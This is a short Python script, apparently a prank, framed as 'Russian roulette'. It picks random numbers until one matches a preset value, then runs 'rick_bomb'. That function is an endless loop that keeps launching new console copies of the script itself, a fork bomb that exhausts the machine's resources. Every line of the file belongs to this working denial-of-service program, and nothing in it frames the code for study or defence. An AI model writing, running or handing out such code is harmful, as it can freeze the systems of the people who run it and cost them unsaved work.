import os
import sys
from time import sleep
import random
import subprocess


ROULETTE = 4

def rick_bomb():
        while True:
            subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
        
def russian_roulette():
    num = random.randint(0, 5)
    print(num)
    if ROULETTE == num:
        print("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!HIT NUMBER!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!")
        rick_bomb()
        return True
    else: return False
    
    
if __name__=="__main__":
    while True:
        sleep(.33)
        if russian_roulette():
            break


